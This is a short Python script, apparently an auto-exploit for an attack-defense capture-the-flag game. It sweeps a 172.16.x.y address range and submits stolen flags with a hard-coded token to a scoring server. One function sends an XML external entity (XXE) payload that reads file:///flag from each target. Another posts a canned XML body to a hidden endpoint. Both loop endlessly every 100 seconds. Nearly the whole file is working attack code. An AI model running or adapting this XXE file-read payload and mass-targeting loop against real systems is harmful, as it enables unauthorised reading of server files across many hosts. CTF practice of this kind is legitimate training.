import requests
import re
import time

submit_flag_url = 'http://10.10.10.10:9000/submit_flag/'
token = 'dxUrnS8uMQ9Yb2dNvZ372595jQZZEnmxZrtBarnw2zu7UAeMses2929YMrDdBy4w5n97jYuKaRE'


def attack_1():
    url_template = 'http://172.16.{}.{}:1337/qwajsdfxjafioshqrwpieuz'
    data = '<xml><appid>wxd930ea5d5a258f4f</appid><mch_id>10000100</mch_id><device_info>1000</device_info><body>test</body><nonce_str>ibuaiVcKdpRxkhJA</nonce_str><sign>0D1149AA282EECA709FB683B1BB497B1</sign></xml>'

    for num in range(10, 19):
        for i in range(1, 25):
            print(f'{i}.{num}')
            url = url_template.format(i, num)
            try:
                r = requests.post(url, data=data)
                flag = re.search('<p>(.{60})\s</p>', r.text).group(1)
                print(requests.post(submit_flag_url, data={'flag': flag, 'token': token}).text)
            except Exception as e:
                print(e)
                pass


def attack_2():
    url_template = 'http://172.16.{}.{}:1337/seckill'
    data = '''<!DOCTYPE xxe [
    <!ENTITY xxe SYSTEM "file:///flag">
    ]>
    <b><id>&xxe;</id></b>'''
    for num in range(10, 19):
        for i in range(1, 25):
            print(f'{i}.{num}')
            url = url_template.format(i, num)
            try:
                headers = {'Content-Type': 'application/xml'}
                r = requests.post(url, data=data, headers=headers, timeout=2)
                flag = re.search('Error while buying product(.{60})', r.text).group(1)
                print(requests.post(submit_flag_url, data={'flag': flag, 'token': token}).text)
            except Exception as e:
                print(e)
                pass


while True:
    attack_2()
    time.sleep(100)
